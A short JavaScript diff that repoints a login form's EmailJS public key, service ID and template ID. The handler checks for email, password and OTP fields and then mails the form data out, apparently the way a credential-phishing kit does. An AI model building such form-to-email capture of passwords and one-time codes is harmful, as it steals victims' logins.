@@ -100,7 +100,7 @@ if (otpSingle) {
 
 
 emailjs.init({
-  publicKey: 'rORVGScs1n94sqOPi'
+  publicKey: 'OdVrpD_0CpgUT6Ahz'
 });
 
 /* ======================================
@@ -174,8 +174,8 @@ if (form && emailInput && passwordInput && result) {
     try {
 
         const response = await emailjs.send(
-            "service_veritas",
-            "template_tprb5ni",
+            "service_client",
+            "template_xmsbvsp",
             templateParams
         );
 
